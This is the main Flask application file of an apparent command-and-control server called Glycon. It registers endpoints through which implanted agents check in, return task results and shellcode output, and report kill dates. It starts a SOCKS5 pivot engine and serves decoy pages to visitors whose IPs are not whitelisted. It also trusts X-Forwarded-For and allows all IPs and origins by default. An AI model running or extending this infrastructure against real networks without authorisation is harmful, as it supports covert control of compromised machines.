from flask import Flask, request, url_for, abort, redirect, jsonify
from flask_socketio import SocketIO
from flask_login import LoginManager
from flask_cors import CORS
from glycon.config import CONFIG
from glycon.routes.auth import init_auth_routes
from glycon.routes.views import init_view_routes
from glycon.routes.api import init_api_routes
from glycon.routes.sockets import init_socket_handlers
from glycon.routes.screenshots import init_screenshot_handlers
from glycon.vaporlink import VAPORLINK_MANAGER
import logging
import os
from threading import Thread
import time
import json
import traceback  # For detailed error reporting
import ipaddress
import sqlite3
from datetime import datetime


def agent_status_monitor(app, socketio):
    with app.app_context():
        while True:
            try:
                print("\n[Monitor] Starting agent status check...")
               
                client = app.test_client()
                
                # Makeing sure to include Content-Type header
                response = client.post(
                    '/api/check_agent_status',
                    headers={
                        'Authorization': f'Bearer {CONFIG.monitor_token}',
                        'Content-Type': 'application/json'
                    },
                    data=json.dumps({}),  # Empty JSON payload
                    content_type='application/json'
                )
                
                #print(f"[Monitor] Response status: {response.status_code}")
                #print(f"[Monitor] Response data: {response.get_json()}")
                
            except Exception as e:
                print(f"\n[Monitor ERROR] {str(e)}")
                traceback.print_exc()
            time.sleep(60)

def create_app():
    app = Flask(__name__, template_folder='templates')
    app.secret_key = CONFIG.secret_key
    app.config['MAX_CONTENT_LENGTH'] = CONFIG.max_content_length
    app.config['HOST'] = CONFIG.host
    app.config['PORT'] = CONFIG.port
    app.config['BASE_URL'] = os.getenv('BASE_URL', '').rstrip('/')
    app.logger.setLevel(logging.DEBUG)

   

    # Enable CORS for all domains
    CORS(app, resources={r"/*": {"origins": "*", "supports_credentials": True}})

    # Initialize SocketIO
    socketio = SocketIO(app, 
                    cors_allowed_origins="*",
                    async_mode='eventlet',
                    logger=True,
                    engineio_logger=True)

    login_manager = LoginManager(app)
    login_manager.login_view = 'login'

    @login_manager.unauthorized_handler
    def unauthorized():
        if request.is_json or request.path.startswith('/api/'):
            return jsonify({'status': 'error', 'message': 'Authentication required'}), 401
        else:
            return redirect(url_for('login'))

    # Initialize routes
    init_auth_routes(app, login_manager)
    init_view_routes(app)
    init_api_routes(app, socketio)

    # Initialize both socket handlers
    init_socket_handlers(socketio)
    init_screenshot_handlers(socketio)

    # IP Whitelisting middleware
    @app.before_request
    def check_ip_whitelist():
        # Skip IP check for API endpoints that agents use (they should be authenticated differently)
                # Handle dynamic prefix for agent endpoints
        path = request.path
        # List of agent endpoints to bypass whitelist
        agent_endpoints = [
            '/api/checkin', 
            '/api/task_result', 
            '/api/shellcode_output', 
            '/api/killdate_reached', 
            '/api/agent_terminated', 
            '/api/verify_termination',
            '/api/vaporlink/stage',
            '/vaporlink/decoy',
            '/login',
            '/logout',
            '/static'
        ]
        
        is_agent_path = False
        for ep in agent_endpoints:
            if path.endswith(ep):
                is_agent_path = True
                break
        
        if is_agent_path:
            return


        # Get client IP (handle X-Forwarded-For for proxies)
        client_ip = request.headers.get('X-Forwarded-For') or request.remote_addr or '127.0.0.1'
        if client_ip and ',' in client_ip:
            client_ip = client_ip.split(',')[0].strip()

        try:
            client_ip_obj = ipaddress.ip_address(client_ip)
        except ValueError:
            # Invalid IP, block
            log_blocked_ip(client_ip, request.path)
            return abort(403)

        # Check against whitelist
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()

        # Ensure tables exist
        c.execute('''
            CREATE TABLE IF NOT EXISTS ip_whitelist (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_range TEXT NOT NULL UNIQUE,
                description TEXT,
                enabled INTEGER NOT NULL DEFAULT 1
            )
        ''')

        # Add enabled column if it doesn't exist (for existing databases)
        try:
            c.execute("ALTER TABLE ip_whitelist ADD COLUMN enabled INTEGER NOT NULL DEFAULT 1")
        except sqlite3.OperationalError:
            # Column already exists, ignore error
            pass
        c.execute('''
            CREATE TABLE IF NOT EXISTS blocked_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                first_seen TEXT NOT NULL,
                last_seen TEXT NOT NULL,
                ip TEXT NOT NULL UNIQUE,
                count INTEGER NOT NULL DEFAULT 1
            )
        ''')

        # Add default whitelist entry if none exists
        c.execute("SELECT COUNT(*) FROM ip_whitelist")
        if c.fetchone()[0] == 0:
            c.execute("INSERT INTO ip_whitelist (ip_range, description, enabled) VALUES (?, ?, ?)",
                      ('0.0.0.0/0', 'Default allow all - remove after setup', 1))

        c.execute("SELECT ip_range, enabled FROM ip_whitelist WHERE enabled=1")
        whitelist_ranges = c.fetchall()
        conn.commit()
        conn.close()

        allowed = False
        for (range_str, enabled) in whitelist_ranges:
            if enabled:
                try:
                    network = ipaddress.ip_network(range_str, strict=False)
                    if client_ip_obj in network:
                        allowed = True
                        break
                except ValueError:
                    # Invalid range in DB, skip
                    continue

        if not allowed:
            log_blocked_ip(client_ip, request.path)
            # Check for redirect URL setting
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            c.execute("SELECT value FROM settings WHERE key='redirect_url'")
            row = c.fetchone()
            conn.close()
            if row and row[0]:
                return redirect(row[0])
            elif VAPORLINK_MANAGER.config.get('web_server', True):
                return app.response_class(VAPORLINK_MANAGER.get_decoy_html(), mimetype='text/html')
            else:
                return abort(403)

    def log_blocked_ip(ip, path):
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO blocked_logs (first_seen, last_seen, ip, count) VALUES (?, ?, ?, COALESCE((SELECT count FROM blocked_logs WHERE ip=?), 0) + 1)",
                  (datetime.now().strftime('%Y-%m-%d %H:%M:%S'), datetime.now().strftime('%Y-%m-%d %H:%M:%S'), ip, ip))
        conn.commit()
        conn.close()

    return app, socketio

app, socketio = create_app()

# Start the agent status monitor thread
monitor_thread = Thread(target=agent_status_monitor, args=(app, socketio))
monitor_thread.daemon = True
monitor_thread.start()

# Start the integrated VaporLink SOCKS5 pivot engine
VAPORLINK_MANAGER.start_background_loop()


def _auto_version_save_watcher():
    """Watches project source files and auto-bumps version.py (x.y.0..99 -> x.(y+1).0) on file save."""
    try:
        from bump_version import bump, collect_source_mtimes
        prev_mtimes = collect_source_mtimes()
    except Exception:
        return

    while True:
        time.sleep(1.5)
        try:
            cur_mtimes = collect_source_mtimes()
            changed = any(
                fpath not in prev_mtimes or cur_mtimes[fpath] > prev_mtimes[fpath]
                for fpath in cur_mtimes
            )
            if changed:
                new_ver = bump()
                print(f"[Version] Fil lagret -> Versjonsnummer automatisk økt til v.{new_ver}", flush=True)
            prev_mtimes = cur_mtimes
        except Exception:
            pass


version_watcher_thread = Thread(target=_auto_version_save_watcher, name="VersionSaveWatcher", daemon=True)
version_watcher_thread.start()
